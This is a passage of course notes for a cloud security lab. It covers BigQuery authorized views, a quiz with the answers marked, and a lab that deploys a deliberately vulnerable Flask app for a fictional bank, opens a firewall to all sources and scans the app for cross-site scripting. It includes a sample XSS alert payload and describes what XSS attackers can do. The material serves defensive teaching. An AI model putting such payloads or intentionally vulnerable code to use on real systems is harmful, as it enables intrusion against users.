dataset.</span></p><p>&nbsp;</p><p><span>When the user queries the view, the view itself has permissions necessary to operate against the table in the </span><strong><span>source_data</span></strong><span> dataset, and it then returns that data to the user.</span></p><p>&nbsp;</p><p><span>The row-filtering view gets the user&#39;s email address and uses that to filter the rows visible. Every user who queries this view will get different results, specifically the rows with her email in the email column.</span></p><h4 id='congratulations-14'><span>Congratulations!</span></h4><p><span>In this lab, you have learned how to do the following:</span></p><ul><li><p><span>Set permissions on BigQuery datasets.</span></p></li><li><p><span>Authorize Views to provide audiences read-only access to subsets of tables.</span></p></li><li><p><span>Use the </span><code>SESSION_USER()</code><span> function to limit access to specific rows within a table/view.</span></p></li></ul><h3 id='quiz-20'><span>QUIZ</span></h3><ol start='' ><li><p><span>Which TWO of the following statements is TRUE with regards to security in BigQuery and its datasets?</span></p></li></ol><ul><li><p><span>Using IAM, you can grant users granular permissions to BigQuery tables, rows and columns.</span></p></li><li><p><strong><span>BigQuery has its own list of assignable IAM roles.</span></strong></p><p><span>Correct! BigQuery role names are mapped to job functions, such as BigQuery admin or BigQuery Data Viewer.</span></p></li><li><p><span>It is always better to assign BigQuery roles to individuals as this will help to lower operational overhead.</span></p></li><li><p><strong><span>A BigQuery Authorized View allows administrators to restrict users to viewing only subsets of a dataset.</span></strong></p><p><span>Correct! Views provide row or column level permissions to datasets.</span></p></li></ul><ol start='2' ><li><p><span>Which TWO of the following statements are TRUE when discussing Cloud Storage and IAM permissions?</span></p></li></ol><ul><li><p><span>Using IAM permissions alone gives you control over your projects, buckets, and individual objects.</span></p></li><li><p><strong><span>Access can be granted to Cloud Storage at the organization, folder, project, or bucket levels.</span></strong></p><p><span>Correct! Besides general access, you can also control what level of access members have.</span></p></li><li><p><span>A user needs permission from both IAM or an ACL to access a bucket or object.</span></p></li><li><p><strong><span>Using deny rules prevent certain principals from using certain permissions, regardless of the roles they&#39;re granted.</span></strong></p><p><span>Correct! You can define deny rules that prevent certain principals from using certain permissions, regardless of the roles they&#39;re granted.</span></p></li></ul><ol start='3' ><li><p><span>Which TWO of the following statements are TRUE when discussing storage and BigQuery best practices?</span></p></li></ol><ul><li><p><span>In most cases, you should use Access Control Lists (ACLs) instead of IAM permissions.</span></p></li><li><p><span>BigQuery data can be adequately secured using the default basic roles available in Google Cloud.</span></p></li><li><p><strong><span>One option to serve content securely to outside users is to use signed URLs.</span></strong></p><p><span>Correct! Using signed URLs, content can be securely made available to users who do not have Google accounts.</span></p></li><li><p><strong><span>Do not use any personally identifiable information as object names.</span></strong></p><p><span>Correct! Storage names often appear in URLs, so any information that is critical to maintaining system or data security should not be used in an object name.</span></p></li></ul><p>&nbsp;</p><h1 id='application-security-techniques-and-best-practices'><span>Application Security: Techniques and Best Practices</span></h1><p>&nbsp;</p><h2 id='lab---identify-application-vulnerabilities-with-security-command-center'><span>LAB - Identify Application Vulnerabilities with Security Command Center</span></h2><h3 id='overview-17'><span>Overview</span></h3><p><span>Web Security Scanner (WSS) is one of </span><a href='https://cloud.google.com/security-command-center'><span>Security Command Center&#39;s</span></a><span> built-in services that can be used to identify security vulnerabilities in App Engine, Google Kubernetes Engine (GKE), and Compute Engine web applications.</span></p><p><span>This service crawls your application, following all links within the scope of your starting URLs, and attempts to exercise as many user inputs and event handlers as possible. It can automatically scan and detect four common vulnerabilities, including cross-site-scripting (XSS), flash injection, mixed content (HTTP in HTTPS), and outdated/insecure libraries.</span></p><p><span>Web Security Scanner enables early identification of vulnerabilities and delivers very low false positive rates. You can easily set up, run, schedule, and manage security scans.</span></p><p><span>In this lab, you use Web Security Scanner to scan a Python Flask application for vulnerabilities.</span></p><h4 id='objectives-14'><span>Objectives</span></h4><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Launch a vulnerable Python Flask application on a Compute Engine instance.</span></p></li><li><p><span>Use Web Security Scanner to scan the application and find vulnerabilities.</span></p></li><li><p><span>Fix the application vulnerability.</span></p></li><li><p><span>Scan the application again and verify vulnerabilities no longer exist.</span></p></li></ul><h3 id='setup-and-requirements-14'><span>Setup and requirements</span></h3><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h3 id='scenario'><span>Scenario</span></h3><p><span>     </span><img src="images\7HNsRbL5DC5fTizZUhMXIP9PpTe%2F03j3kzaLp2KOqmI%3D" referrerpolicy="no-referrer" alt="Cymbal Bank logo"></p><p>&nbsp;</p><p><span>Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.</span></p><p><span>Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group&#39;s proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.</span></p><p><span>Cymbal Bank is interested in developing a new banking application for their corporate clients using Google Cloud technology. Application security is critical, and the CTO wants to see how Google Cloud can identify and mitigate application security vulnerabilities. As a Cloud Security Engineer, you are tasked with demonstrating Security Command Center&#39;s cutting-edge application vulnerability scanning features.</span></p><h3 id='task-1-launch-a-virtual-machine-and-create-a-firewall-rule-for-wss'><span>Task 1. Launch a virtual machine and create a firewall rule for WSS</span></h3><p><span>In this task, you set up the infrastructure to demonstrate an application vulnerability to Cymbal Bank&#39;s CTO. More specifically, you deploy a virtual machine and open a firewall rule for Web Security Scanner to be able to access the vulnerable application that you intend to deploy.</span></p><ol start='' ><li><p><span>On the Google Cloud console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Create a static IP address that can be used for scanning a vulnerable web application by running the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute addresses create xss-test-ip-address --region=europe-west4</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to output the static IP address you just generated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute addresses describe xss-test-ip-address \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=europe-west4 --format="value(address)"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Copy the IP address (a single line of the output) and save it in a notepad.</span></p></li><li><p><span>Run the following command to create a VM instance to run the vulnerable application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create xss-test-vm-instance \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--address=xss-test-ip-address --no-service-account \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--no-scopes --machine-type=e2-micro --zone=europe-west4-a \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--metadata=startup-script='apt-get update; apt-get install -y python3-flask'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The startup script installs python-flask, a Web Application Framework, which is used for running a simple Python application demonstrating cross-site scripting (XSS) vulnerability, which is a common web application security vulnerability.</span></p><ol start='' ><li><p><span>Run the following command to open a firewall rule for Web Security Scanner to access a vulnerable application. Note the source ranges from which Web Security Scanner scans applications.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create enable-wss-scan \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS --priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=default --action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:8080 --source-ranges=0.0.0.0/0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create the VM with desired configurations</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-2-deploy-a-vulnerable-application-to-trigger-an-xss-vulnerability'><span>Task 2. Deploy a vulnerable application to trigger an XSS vulnerability</span></h3><p><span>In this task, you obtain the application code and introduce a vulnerability for Web Security Scanner to detect. This is in the form of an application, which is a simple form that receives a user&#39;s input and outputs it without any changes.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Compute Engine</span></strong><span> </span><strong><span>&gt;</span></strong><span> </span><strong><span>VM Instances</span></strong><span>.</span></p><p><span>This may take a minute to initialize for the first time.</span></p></li><li><p><span>Then click on the </span><strong><span>SSH</span></strong><span> button next to your instance:</span></p></li></ol><p><img src="https://cdn.qwiklabs.com/18AiGcc4NgZ78wIbJX3fPQOk4aECAx2liEiwXEEvhiQ%3D" referrerpolicy="no-referrer" alt="SSH button in Cloud console"></p><ol start='' ><li><p><span>A pop-up may appear, asking you to allow SSH in-browser to connect to VMs. Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><span>This opens an SSH connection to your VM instance in a new window.</span></p><ol start='' ><li><p><span>In this SSH window (*</span><strong><span>Not in Cloud Shell</span><span>*</span></strong><span>), run the following command to download and extract the vulnerable web application files:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://cloud-training/GCPSEC-ScannerAppEngine/flask_code.tar  . &amp;&amp; tar xvf flask_code.tar</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now run the following command to deploy your application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Soon after, you should receive a message that indicates your application is up and running.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Serving Flask app "app" (lazy loading)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Environment: production</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; WARNING: This is a development server. Do not use it in a production deployment.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Use a production WSGI server instead.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Debug mode: off</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><ol start='' ><li><p><span>Find the static IP address of the VM you copied into your notepad earlier.</span></p></li><li><p><span>Replace </span><code>YOUR_EXTERNAL_IP</code><span> in the URL field below with that IP address, and open the URL in a new browser tab:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">http://&lt;YOUR_EXTERNAL_IP&gt;:8080</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> You can also find the external IP address in the Google Cloud console, where it&#39;s listed as a field associated with your VM instance.</span></p><p><span>A Cymbal Bank corporate banking portal with a web form should appear.</span></p><ol start='' ><li><p><span>In the web form, enter the following string:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;script&gt;alert('This is an XSS Injection')&lt;/script&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now click the </span><strong><span>POST</span></strong><span> button.</span></p></li></ol><p><span>You should receive the following alert window.</span></p><p><img src="images\2JDmvcyzlCfFS71m72VCY%2BEXkNpwbZbxGUnWSWIHnCo%3D" referrerpolicy="no-referrer" alt="Alert window in browser"></p><p><span>This is a common vulnerability in web applications: a cross-site scripting vulnerability. Cross-site scripting (XSS) is a vulnerability that enables attackers to run malicious scripts in users&#39; browsers in the context of your application. Your browser interprets a string as a legitimate Javascript and executes it.</span></p><p><span>An attacker who uses an XSS bug to inject JavaScript into an HTML page gains virtually unlimited access to the logged-in sessions of the victims who visit the page: they may steal user data, tamper with it, change privacy or security settings, or even completely alter the way the product looks and operates. Even more, an XSS vulnerability in one application, no matter how inconsequential, may jeopardize other content within the same domain.</span></p><p><span>This is one of many application vulnerabilities that Web Security Scanner can help you identify.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Download vulnerable web application files on the VM</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-3-enable-the-web-security-scanner-api'><span>Task 3. Enable the Web Security Scanner API</span></h3><p><span>Now that the vulnerable application is launched, it&#39;s time to demonstrate Web Security Scanner&#39;s abilities to the CTO. But first, you need to configure the API that WSS uses to run.</span></p><ol start='' ><li><p><span>Switch back to the Cloud console browser tab.</span></p></li><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>APIs &amp; Services</span></strong><span> </span><strong><span>&gt;</span></strong><span> </span><strong><span>Library</span></strong><span>.</span></p></li><li><p><span>In the Search for APIs and services field, type </span><code>Web Security Scanner</code><span> and press </span><strong><span>Enter</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Web Security Scanner API</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Enable</span></strong><span> to enable the Web Security Scanner API.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Enable the Web Security Scanner API</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-4-scan-the-deployed-application-with-wss'><span>Task 4. Scan the deployed application with WSS</span></h3><p><span>In this task, you configure and set up a scan of the application to check if it finds security vulnerabilities.</span></p><ol start='' ><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), and select </span><strong><span>Security</span></strong><span> </span><strong><span>&gt;</span></strong><span> </span><strong><span>Web Security Scanner</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ New Scan</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Starting URLs</span></strong><span> section, the </span><strong><span>Starting URL 1</span></strong><span> field should be pre-populated with your static IP address.</span></p></li><li><p><span>Add the port number </span><strong><span>8080</span></strong><span>, so that the Starting URL resembles the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 